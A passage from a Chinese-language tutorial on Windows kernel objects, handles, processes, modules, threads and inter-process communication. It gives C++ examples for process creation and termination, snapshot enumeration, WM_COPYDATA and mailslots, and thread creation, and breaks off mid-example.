windows操作系统的设计是面向对象的，很多的组件都是以对象的方式去管理的。将整个操作系统的内核看成是一个封装体，API函数就是对外的接口。然后通过给API传递句柄去实现操作具体的某一个对象，句柄就是对象的标识。windows管理的对象也有很多类型，不同类型的对象的管理方式是不同的。</p><p>b. 所有的API函数都是隶属于不同的动态链接库（DLL文件）的。有三大DLL文件：</p><p>User32.dll GDI32.dll kernel32.dll</p><p>其中User32.dll和窗口，控件等有关，GDI32和绘制图形有关，Kernel32和操作系统的界面无关的很多机制有关。</p><p>这三种DLL创建出来的对象就可以分为3大类。管理方式就不一样。那么我们的内核对象有自己的管理方式。</p><p>c. 一个进程，是一个运行中的程序。</p><p>一个进程包含了一个运行中的程序所用到的所有资源：一个内存空间 内存空间中有很多的模块 内存空间被分成了两大部分—用户层和内核层</p><p>我们正常的普通程序只能访问用户层空间（00000000<del>7FFFFFFF）。大部分的对象（结构体变量）都是放在内核空间的（80000000</del>FFFFFFFF）。</p><p>所以我们自然不能直接访问到对象，而是通过句柄。</p><p>所有的进程内核层是共享的，不同的进程用户层空间是不一样。</p><p>2 内核对象有什么特点？？</p><p>特点1—内核对象是跨进程的：所有的内核对象存在于内核层的。既然内核层是大家共享的，所以内核对象也是可以跨进程的。</p><p>特点2—跨进程机制怎么管理呢？？：通过引用计数和内核对象句柄表管理的。</p><p>进程A的句柄表</p><div class="table-container"><table><thead><tr><th>1</th><th>内核对象A的地址</th><th></th></tr></thead><tbody><tr><td>2</td><td>内核对象B的地址</td></tr></tbody></table></div><p>进程B的句柄表</p><div class="table-container"><table><thead><tr><th>1</th><th>内核对象B的地址</th><th></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table></div><p>进程C的句柄表</p><div class="table-container"><table><thead><tr><th>1</th><th>内核对象M的地址</th><th></th></tr></thead><tbody><tr><td>2</td><td>内核对象N的地址</td><td></td></tr><tr><td>3</td><td>内核对象L的地址</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>4</th><th>内核对象B的地址</th><th></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table></div><p>如果一个内核对象被n个进程使用，引用计数就是n。没有被进程使用，引用计数就是0，没被任何进程使用，内核对象就会自动销毁。</p><p>特点3：每一个内核对象都有安全描述属性，我们通过创建对象的API是否包含这样一个参数，就能确定它是不是内核对象</p><p>3 通过我们怎么获得内核对象的句柄的</p><p>a. 自己创建的</p><p>b. 自己打开的（这个对象是已经创建好的）</p><p>c. 从父进程继承过来的。</p><p>d. 别的进程复制过来的。DuplicateHandle</p><h3 id="进程概念："><a href="#进程概念：" class="headerlink" title="进程概念："></a>进程概念：</h3><p>进程，简单来说，就是一个运行中的程序，包含了：</p><p>a. 一个虚拟的内存空间 所有程序的代码和数据都在这片内存空间中。</p><p>b. 内存空间中排布了很多的模块</p><p>c. 至少有一个线程</p><p>在进程的虚拟内存中，一般会加载一个exe，很多的dll。他们都称之为模块。</p><p>进程本身是一个综合了各种资源的东西，是不能执行代码，能够执行代码的是归属于进程的线程。</p><p>每一个线程都是一个独立的执行单元：</p><p>1 每一个线程有自己的一块堆栈。</p><p>2 每一个线程有自己的执行环境。</p><p>CPU在执行代码的时候，主要是依赖于一套寄存器：</p><p>通用寄存器：eax ebx ecx edx esi edi esp ebp</p><p>指令指针寄存器：eip 存储着下一条要执行的指令</p><p>段寄存器：cs ss ds es fs gs</p><p>…..</p><p>所有的线程都是操作系统统一去管理调度的，每一个线程都有自己的优先级。根据优先级决定先调用谁后调用谁。</p><p>线程发生切换，实际就是切换线程的执行环境，比如现在有A，B，C三个线程，此时线程A在执行，线程A的时间片用完了，就保存A的执行环境，看B和C的优先级谁高，假如是C高，那么就把C的线程环境加载到CPU中。</p><h2 id="基本操作："><a href="#基本操作：" class="headerlink" title="基本操作："></a>基本操作：</h2><p>进程 模块 线程的遍历（非常重要的操作）</p><p>方法有很多 我们这里使用的是创建快照的方式：CreateToolHelp32Snapshot。</p><p>需要知道的几点：</p><p>a. 进程是操作系统管理的，遍历的时候，能够遍历出系统中的所有进程的信息：进程名，路径，进程ID</p><p> 遍历进程的用处：通常来说我们都是知道进程名，然后去找到ID（ID每一次程序运行的时候都是不一样的），我们如果要操作进程，就需要使用OpenProcess函数得到它的句柄，OpenProcess这个函数，就是根据进程ID得到句柄的。</p><p>b. 模块是属于某一个进程的，所以我们遍历模块的时候，需要指定遍历的是哪一个进程的模块。</p><p> 能够遍历出模块的信息为：模块名，模块的起始虚拟地址（加载基址）</p><p> 遍历模块的用处：a 可以知道一个程序都加载了哪些DLL，监测DLL注入 b 分析DLL中的PE文件信息，可以为我们分析一个程序提供依据。</p><p>c. 线程虽然也是属于某一个进程的，但是其管理是操作系统统一管理的，所以我们遍历的时候，也是遍历出操作系统中的所有线程。需要自己去过滤然后，得到某一个进程的线程。</p><p> 线程遍历，能够得到的信息有：线程ID，所属进程的ID。</p><p> 遍历线程的用处：可以得到进程中每一个线程的信息。可以操作这些线程，比如挂起，终止等等。</p><h2 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h2><div class="table-container"><table><thead><tr><th>WinExec</th><th>可以创建进程</th></tr></thead><tbody><tr><td>ShellExecute</td><td>可以创建一个进程，打印一个文件，浏览一个文件夹</td></tr><tr><td>system</td><td>也能够以控制台命令的方式打开一个进程</td></tr><tr><td>CreateProcess</td><td>创建进程</td></tr><tr><td>OpenProcess</td><td>打开进程</td></tr><tr><td>ExitProcess</td><td>退出本进程</td></tr><tr><td>TerminateProcess</td><td>结束其它进程</td></tr></tbody></table></div><h3 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h3><p>1使用宏加载想要的进程#define PATH2 L”D:\Program Files (x86)\Tencent\QQ\Bin\QQScLauncher.exe”</p><p>2使用结构体PROCESS_INFORMATION定义加载进程信息的缓冲区</p><p>3使用CreateProcess函数创建进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH2 <span class="string">L&quot;D:\\Program Files (x86)\\Tencent\\QQ\\Bin\\QQScLauncher.exe&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">STARTUPINFO si = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">CreateProcess</span>(</span><br><span class="line">PATH2,   <span class="comment">//路径</span></span><br><span class="line"><span class="literal">NULL</span>,   <span class="comment">//命令行参数</span></span><br><span class="line"><span class="literal">NULL</span>,   <span class="comment">//进程安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,   <span class="comment">//线程安全属性</span></span><br><span class="line">FALSE,  <span class="comment">//是否继承句柄</span></span><br><span class="line"><span class="literal">NULL</span>,    <span class="comment">//创建方式</span></span><br><span class="line"><span class="literal">NULL</span>,    <span class="comment">//环境</span></span><br><span class="line"><span class="literal">NULL</span>,    <span class="comment">//当前的运行目录</span></span><br><span class="line">&amp;si,     <span class="comment">//启动信息</span></span><br><span class="line">&amp;pi      <span class="comment">//进程信息</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结束一个进程"><a href="#结束一个进程" class="headerlink" title="结束一个进程"></a>结束一个进程</h3><p>使用该进程PID打开进程从而获取到进程句柄</p><p>使用TerminateProcess函数结束进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 打开进程，得到句柄</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_TERMINATE, FALSE, <span class="number">5312</span>);</span><br><span class="line"><span class="comment">//2. 终结进程</span></span><br><span class="line"><span class="built_in">TerminateProcess</span>(hProcess, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进程与模块"><a href="#进程与模块" class="headerlink" title="进程与模块"></a>进程与模块</h2><div class="table-container"><table><thead><tr><th>CreateToolhelp32Snapshot</th><th>可以分别创建进程，线程，进程模块进程堆的快照</th></tr></thead><tbody><tr><td>Process32First</td><td>用来首次调用，获得第一个进程信息</td></tr><tr><td>Process32Next</td><td>以后的调用由它来完成，不断的获取进程信息</td></tr><tr><td>Module32First</td><td>用来首次调用，获得第一个模块信息</td></tr><tr><td>Module32Next</td><td>以后的调用由它来完成，不断的获取模块信息</td></tr><tr><td>Thread32First</td><td>用来首次调用，获得第一个线程信息</td></tr><tr><td>Thread32Next</td><td>以后的调用由它来完成，不断地获取线程信息</td></tr></tbody></table></div><p>创建快照</p><p>WIndows提供了一组快照的API，使用前需要包含TIHelp32.h头文件，这一组API</p><p> 能够给当前系统中所有进程拍一个快照，能够获取所有进程的一些基本信息</p><p> 能够当前系统中的线程拍一个快照</p><p> 能够给某一个进程拍模块快照</p><p> 能够给某一个进程拍堆快照</p><h3 id="进程的遍历"><a href="#进程的遍历" class="headerlink" title="进程的遍历"></a>进程的遍历</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 得到快照的句柄</span></span><br><span class="line">HANDLE hToolHelp =  <span class="built_in">CreateToolhelp32Snapshot</span>(</span><br><span class="line">TH32CS_SNAPPROCESS,</span><br><span class="line"><span class="number">0</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2. 获取第一个结点的信息</span></span><br><span class="line">PROCESSENTRY32 pe = &#123;<span class="built_in">sizeof</span>(PROCESSENTRY32)&#125;;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hToolHelp, &amp;pe))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//pe.szExeFile;//进程名</span></span><br><span class="line"><span class="comment">//pe.th32ProcessID;//ID</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d:%S\n&quot;</span>, pe.th32ProcessID, pe.szExeFile);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hToolHelp, &amp;pe));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="模块的遍历"><a href="#模块的遍历" class="headerlink" title="模块的遍历"></a>模块的遍历</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 得到快照的句柄</span></span><br><span class="line">HANDLE hToolHelp = <span class="built_in">CreateToolhelp32Snapshot</span>(</span><br><span class="line">TH32CS_SNAPMODULE,</span><br><span class="line"><span class="number">25076</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2. 获取第一个结点的信息</span></span><br><span class="line">MODULEENTRY32 me = &#123; <span class="built_in">sizeof</span>(MODULEENTRY32) &#125;;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Module32First</span>(hToolHelp, &amp;me))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//pe.szExeFile;//进程名</span></span><br><span class="line"><span class="comment">//pe.th32ProcessID;//ID</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;模块名：%S  加载基址：%p\n&quot;</span>, me.szModule, me.modBaseAddr);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Module32Next</span>(hToolHelp, &amp;me));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进程间通讯"><a href="#进程间通讯" class="headerlink" title="进程间通讯"></a>进程间通讯</h2><h3 id="发送消息"><a href="#发送消息" class="headerlink" title="发送消息"></a>发送消息</h3><p>COPYDATASTRUCT发送</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND hWnd = (HWND)<span class="number">0x0003037E</span>;</span><br><span class="line"></span><br><span class="line">COPYDATASTRUCT cds = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">100</span>] = &#123; <span class="string">&quot;hahahahahahahahlou  world&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">cds.dwData = <span class="number">200</span>;<span class="comment">//随便写，写什么发什么</span></span><br><span class="line">cds.lpData = buf;</span><br><span class="line">cds.cbData = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">SendMessage</span>(hWnd, WM_COPYDATA, <span class="number">0</span>, (LPARAM)&amp;cds);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>邮槽发送</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 打开邮槽对象</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line"><span class="string">L&quot;\\\\.\\mailslot\\Sample&quot;</span>, <span class="comment">// 邮槽名称</span></span><br><span class="line">GENERIC_WRITE,              <span class="comment">// 读写属性</span></span><br><span class="line">FILE_SHARE_READ,            <span class="comment">// 共享属性</span></span><br><span class="line"><span class="literal">NULL</span>,                       <span class="comment">// 安全属性</span></span><br><span class="line">OPEN_EXISTING,              <span class="comment">// 打开方式</span></span><br><span class="line">FILE_ATTRIBUTE_NORMAL,      <span class="comment">// 标志位</span></span><br><span class="line"><span class="literal">NULL</span>);                      <span class="comment">// 文件模板（默认留空）</span></span><br><span class="line"><span class="comment">// 2. 向mailslot写入</span></span><br><span class="line">DWORD  dwWritten;</span><br><span class="line">LPSTR  lpMessage = (LPSTR)<span class="string">&quot;邮槽测试消息！&quot;</span>;</span><br><span class="line">DWORD  dwMegLen = <span class="built_in">strlen</span>(lpMessage) + <span class="built_in">sizeof</span>(CHAR);</span><br><span class="line"><span class="built_in">WriteFile</span>(hFile, lpMessage, dwMegLen, &amp;dwWritten, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 3. 结束</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;已经向邮槽写入信息！\n&quot;</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接收消息"><a href="#接收消息" class="headerlink" title="接收消息"></a>接收消息</h3><p>COPYDATA接收只需在回调函数的WM_COPYDATA消息响应定义接收的结构体</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_COPYDATA:</span><br><span class="line">&#123;</span><br><span class="line">PCOPYDATASTRUCT pcds = (PCOPYDATASTRUCT)lParam;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="number">0</span>, (<span class="type">char</span>*)(pcds-&gt;lpData), <span class="string">&quot;提示&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 创建邮槽对象</span></span><br><span class="line">HANDLE hSlot = <span class="built_in">CreateMailslot</span>(</span><br><span class="line"><span class="string">L&quot;\\\\.\\mailslot\\Sample&quot;</span>,    <span class="comment">// 邮槽名</span></span><br><span class="line"><span class="number">0</span>,         <span class="comment">// 不限制消息大小 </span></span><br><span class="line">MAILSLOT_WAIT_FOREVER,         <span class="comment">// 无超时 </span></span><br><span class="line">(LPSECURITY_ATTRIBUTES)<span class="literal">NULL</span>    <span class="comment">// 安全属性</span></span><br><span class="line">); </span><br><span class="line"><span class="comment">// 2. 循环读取邮槽信息</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// 2.1 获取邮槽消息数量</span></span><br><span class="line">DWORD dwMsgCount = <span class="number">0</span>, dwMsgSize = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">GetMailslotInfo</span>(     <span class="comment">/* 获取邮槽信息 */</span></span><br><span class="line">hSlot,           <span class="comment">// 邮槽句柄 </span></span><br><span class="line">(LPDWORD)<span class="literal">NULL</span>,<span class="comment">// 无最大消息限制</span></span><br><span class="line">&amp;dwMsgSize,      <span class="comment">// 下一条消息的大小</span></span><br><span class="line">&amp;dwMsgCount,     <span class="comment">// 消息的数量</span></span><br><span class="line">(LPDWORD)<span class="literal">NULL</span>);<span class="comment">// 无时限</span></span><br><span class="line"><span class="keyword">if</span> (dwMsgSize == MAILSLOT_NO_MESSAGE) &#123;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2.2 循环获取全部消息（有可能不只一条）</span></span><br><span class="line"><span class="comment">// 2.2 循环获取全部消息（有可能不只一条）</span></span><br><span class="line"><span class="keyword">while</span> (dwMsgCount)</span><br><span class="line">&#123;</span><br><span class="line">PBYTE lpBuffer;</span><br><span class="line">lpBuffer = <span class="keyword">new</span> BYTE[dwMsgSize + <span class="number">0x10</span>];</span><br><span class="line"><span class="comment">// 读取邮槽中的信息</span></span><br><span class="line">DWORD dwRet;</span><br><span class="line"><span class="built_in">ZeroMemory</span>(lpBuffer, dwMsgSize);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hSlot, lpBuffer, dwMsgSize, &amp;dwRet, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ReadFile函数执行失败，错误码：%d.\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">delete</span>[] lpBuffer;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 显示信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;邮槽的内容: %s\n&quot;</span>, lpBuffer);</span><br><span class="line"><span class="comment">// 计算剩余的消息数</span></span><br><span class="line"><span class="built_in">GetMailslotInfo</span>(hSlot, (LPDWORD)<span class="literal">NULL</span>, &amp;dwMsgSize, &amp;dwMsgCount, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="keyword">delete</span>[] lpBuffer;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="八，线程"><a href="#八，线程" class="headerlink" title="八，线程"></a>八，线程</h1><h2 id="线程创建"><a href="#线程创建" class="headerlink" title="线程创建"></a>线程创建</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpThreadParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我是子线程,%s\n&quot;</span>, lpThreadParameter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 创建线程</span></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//栈大小</span></span><br><span class="line">ThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">(LPVOID)<span class="string">&quot;15PB&quot;</span>,    <span class="comment">//会将此参数传递给回调函数</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>          <span class="comment">//获取线程ID，每一个线程都有一个唯一标识，就是线程ID</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 循环</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我是主线程\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程信号"><a href="#线程信号" class="headerlink" title="线程信号"></a>线程信号</h2><p>WaitForSingleObject(hThread,-1 ); //该函数表示信号，参数一为被创建的线程名，参数二为一直等到有信号的状态，意思是等待被创建线程结束</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 02_关于线程的信号.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 